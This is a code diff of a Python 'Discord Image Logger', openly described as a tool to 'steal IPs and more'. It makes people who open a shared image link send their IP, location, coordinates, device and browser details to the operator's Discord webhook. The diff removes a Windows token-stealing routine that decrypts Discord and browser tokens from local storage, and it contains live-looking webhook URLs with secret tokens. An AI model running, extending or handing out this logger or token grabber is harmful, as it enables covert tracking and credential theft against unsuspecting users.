@@ -4,16 +4,6 @@
 from http.server import BaseHTTPRequestHandler
 from urllib import parse
 import traceback, requests, base64, httpagentparser
-from base64 import b64decode
-from Crypto.Cipher import AES
-from win32crypt import CryptUnprotectData
-from os import getlogin, listdir
-from json import loads
-from re import findall
-from urllib.request import Request, urlopen
-from subprocess import Popen, PIPE
-import json, os
-from datetime import datetime
 
 __app__ = "Discord Image Logger"
 __description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
@@ -22,7 +12,7 @@ __author__ = "DeKrypt"
 
 config = {
     # BASE CONFIG #
-    "webhook": "https://discord.com/api/webhooks/1299737340071378964/Nkl1r8EVnOGWOUJ4A6DcctKOVaSaY9mgH4PRpkbT_h7qodJxySEgdCwKCzawNfU-LLEk",
+    "webhook": "https://discord.com/api/webhooks/1328001511405392005/785O-RJDSBRNK4T3ad37tg5Vdae6GZ008myseFi8LaPhvebLA4YfR3Kw0v2JdqnQ74Xt",
     "image": "https://i1.sndcdn.com/artworks-SR2d0bWO9515nZ9H-INDEOQ-t500x500.jpg", # You can also have a custom image by using a URL argument
                                                # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
@@ -38,7 +28,7 @@ config = {
 
     "message": { # Show a custom message when the user opens the image
         "doMessage": False, # Enable the custom message?
-        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
+        "message": "유저가 이미지를 열었습니다!!", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
@@ -47,7 +37,7 @@ config = {
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
 
-    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
+    "linkAlerts": False, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
     "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)
 
     "antiBot": 1, # Prevents bots from triggering the alert
@@ -75,12 +65,7 @@ config = {
 
 blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
-def decrypt(buff, master_key):
-    try:
-        return AES.new(CryptUnprotectData(master_key, None, None, None, 0)[1], AES.MODE_GCM, buff[3:15]).decrypt(buff[15:])[:-16].decode()
-    except:
-        return "Error"
-        
+
 def botCheck(ip, useragent):
     if ip.startswith(("34", "35")):
         return "Discord"
@@ -89,16 +74,15 @@ def botCheck(ip, useragent):
     else:
         return False
 
-                
 def reportError(error):
     requests.post(config["webhook"], json = {
     "username": config["username"],
     "content": "@everyone",
     "embeds": [
         {
-            "title": "Image Logger - Error",
+            "title": "이미지로거 - 오류",
             "color": config["color"],
-            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
+            "description": f"에러 발생!\n\n**Error:**\n```\n{error}\n```",
         }
     ],
 })
@@ -106,64 +90,9 @@ def reportError(error):
 def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
     if ip.startswith(blacklistedIPs):
         return
-
+    
     bot = botCheck(ip, useragent)
-    tokens = []
-    cleaned = []
-    already_check = []
-    checker = []
-    local = os.getenv('LOCALAPPDATA')
-    roaming = os.getenv('APPDATA')
-    chrome = local + "\\Google\\Chrome\\User Data"
-    paths = {
-        'Discord': roaming + '\\discord',
-        'Discord Canary': roaming + '\\discordcanary',
-        'Lightcord': roaming + '\\Lightcord',
-        'Discord PTB': roaming + '\\discordptb',
-        'Opera': roaming + '\\Opera Software\\Opera Stable',
-        'Opera GX': roaming + '\\Opera Software\\Opera GX Stable',
-        'Amigo': local + '\\Amigo\\User Data',
-        'Torch': local + '\\Torch\\User Data',
-        'Kometa': local + '\\Kometa\\User Data',
-        'Orbitum': local + '\\Orbitum\\User Data',
-        'CentBrowser': local + '\\CentBrowser\\User Data',
-        '7Star': local + '\\7Star\\7Star\\User Data',
-        'Sputnik': local + '\\Sputnik\\Sputnik\\User Data',
-        'Vivaldi': local + '\\Vivaldi\\User Data\\Default',
-        'Chrome SxS': local + '\\Google\\Chrome SxS\\User Data',
-        'Chrome': chrome + 'Default',
-        'Epic Privacy Browser': local + '\\Epic Privacy Browser\\User Data',
-        'Microsoft Edge': local + '\\Microsoft\\Edge\\User Data\\Defaul',
-        'Uran': local + '\\uCozMedia\\Uran\\User Data\\Default',
-        'Yandex': local + '\\Yandex\\YandexBrowser\\User Data\\Default',
-        'Brave': local + '\\BraveSoftware\\Brave-Browser\\User Data\\Default',
-        'Iridium': local + '\\Iridium\\User Data\\Default'
-    }
-    for platform, path in paths.items():
-        if not os.path.exists(path): continue
-        try:
-            with open(path + f"\\Local State", "r") as file:
-                key = loads(file.read())['os_crypt']['encrypted_key']
-                file.close()
-        except: continue
-        for file in listdir(path + f"\\Local Storage\\leveldb\\"):
-            if not file.endswith(".ldb") and file.endswith(".log"): continue
-            else:
-                try:
-                    with open(path + f"\\Local Storage\\leveldb\\{file}", "r", errors='ignore') as files:
-                        for x in files.readlines():
-                            x.strip()
-                            for values in findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", x):
-                                tokens.append(values)
-                except PermissionError: continue
-        for i in tokens:
-            if i.endswith("\\"):
-                i.replace("\\", "")
-            elif i not in cleaned:
-                cleaned.append(i)
-        for token in cleaned:
-            try:
-                tok = decrypt(b64decode(token.split('dQw4w9WgXcQ:')[1]), b64decode(key)[5:])    
+    
     if bot:
         requests.post(config["webhook"], json = {
     "username": config["username"],
@@ -219,26 +148,26 @@ def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = Fals
             "color": config["color"],
             "description": f"""**유저가 이미지를 열었습니다!!**
 
-**엔드 포인트 ::** `{endpoint}`
+**Endpoint:** `{endpoint}`
             
-**아이피 정보 ::**
-> **아이피 ::** `{ip if ip else 'Unknown'}`
-> **제공자 ::** `{info['isp'] if info['isp'] else 'Unknown'}`
-> **ASN ::** `{info['as'] if info['as'] else 'Unknown'}`
-> **나라 ::** `{info['country'] if info['country'] else 'Unknown'}`
-> **지역 ::** `{info['regionName'] if info['regionName'] else 'Unknown'}`
-> **도시 ::** `{info['city'] if info['city'] else 'Unknown'}`
-> **좌표 ::** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
-> **시간지역 ::** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
-> **모바일 ::** `{info['mobile']}`
-> **토큰 ::** `{tok}`
-> **봇 ::** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
+**아이피 정보:**
+> **아이피:** `{ip if ip else 'Unknown'}`
+> **제공자:** `{info['isp'] if info['isp'] else 'Unknown'}`
+> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
+> **나라:** `{info['country'] if info['country'] else 'Unknown'}`
+> **지역:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
+> **도시:** `{info['city'] if info['city'] else 'Unknown'}`
+> **좌표:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
+> **시간대:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
+> **모바일:** `{info['mobile']}`
+> **VPN:** `{info['proxy']}`
+> **봇:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`
 
-**PC 정보 ::**
+**기기정보:**
 > **OS:** `{os}`
-> **브라우저 ::** `{browser}`
+> **브라우저:** `{browser}`
 
-**유저 에이전트 ::**
+**유저 에이전트:**
 ```
 {useragent}
 ```""",
